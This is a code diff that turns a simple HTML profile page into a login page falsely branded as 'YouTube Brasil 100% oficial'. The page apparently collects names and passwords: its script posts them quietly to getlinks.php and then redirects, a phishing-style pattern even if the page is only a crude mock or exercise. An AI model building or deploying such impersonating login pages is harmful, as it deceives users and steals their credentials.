@@ -3,21 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTubers</title>
-    <link rel="stylesheet" href="font-awesome/css/font-awesome.css">
+    <title>Youtube verdadeiro</title>
     <link rel="stylesheet" href="reset.css">
     <link rel="stylesheet" href="style.css">
 </head>
-<body>
-    <div id="user">
-        <p id="nome"></p>
-        <img src="" alt="" id="foto">
-        <p id="frase"></p>
-        <p id="instagram">
-            <i class="fa fa-instagram" aria-hidden="true"></i>
-        </p>
-        <div id="container-links"></div>
+<body id="box">
+    <h1>YouTube Brasil 100% oficial</h1>
+    
+    <div id="login">
+        <h2>Login</h2>
+        <form id="Login">
+            <label for="nomeU">Nome:</label>
+            <input type="text" id="nomeU" name="nomeU" required placeholder="Mara Luiza">
+            <br> <br>
+            <label for="senha">Senha:</label>
+            <input type="password" id="senha" name="senha" required placeholder="mara123">
+            <br> <br>
+            <button type="submit">Logar</button>
+        </form>
     </div>
+    
 </body>
 </html>
-<script src="script.js"></script>
+
+<script>
+    document.getElementById("Login").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const formData = new FormData(this);
+        fetch("getlinks.php", {method: "POST", body: formData});
+        window.location.href = "perfil.html";
+    });
+</script>
